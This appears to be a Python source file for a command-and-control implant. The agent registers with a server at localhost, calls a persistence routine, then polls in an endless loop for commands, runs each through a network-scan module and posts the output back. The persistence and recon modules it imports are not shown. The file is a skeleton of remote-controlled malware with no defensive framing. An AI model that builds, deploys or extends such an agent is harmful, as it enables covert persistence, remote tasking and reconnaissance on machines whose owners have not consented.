import requests
import time
from modules.recon import network_scan
from modules.persistence import set_persistence

SERVER_URL = "http://localhost:8000"

def register_agent():
    data = {"id": "agent_123"}
    requests.post(f"{SERVER_URL}/register", json=data)

def execute_commands():
    while True:
        try:
            response = requests.get(f"{SERVER_URL}/commands")
            if response.status_code == 200:
                commands = response.json().get("commands", [])
                for cmd in commands:
                    result = network_scan(cmd)
                    requests.post(f"{SERVER_URL}/result", json={"output": result})
        except Exception as e:
            print(f"Erro: {e}")
            time.sleep(5)

if __name__ == "__main__":
    register_agent()
    set_persistence()
    execute_commands()